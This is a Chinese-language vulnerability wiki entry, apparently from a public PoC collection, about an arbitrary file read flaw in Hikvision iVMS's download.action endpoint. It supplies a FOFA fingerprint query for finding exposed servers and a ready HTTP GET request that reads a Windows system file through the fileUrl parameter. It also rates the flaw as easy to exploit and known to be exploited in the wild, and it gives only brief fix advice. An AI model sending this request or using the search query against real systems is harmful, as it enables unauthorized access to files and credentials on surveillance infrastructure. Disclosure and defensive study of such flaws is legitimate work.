---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

#  海康威视iVMS download.action任意文件读取漏洞

# 漏洞描述

海康威视iVMS download.action 存在任意文件读取漏洞，未授权的攻击者可获取数据库敏感信息。

# 影响版本

海康威视iVMS

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/home/locationIndex.action?time=" || header="ISMS_8700_Sessionname"

POC/EXP：

```
GET /eps/triggerSnapshot/download.action?fileUrl=file:///C:/windows/win.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: MicroMessenger
```

![image-20250324202319685](./.resource/海康威视iVMSdownload.action任意文件读取漏洞/media/image-20250324202319685.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
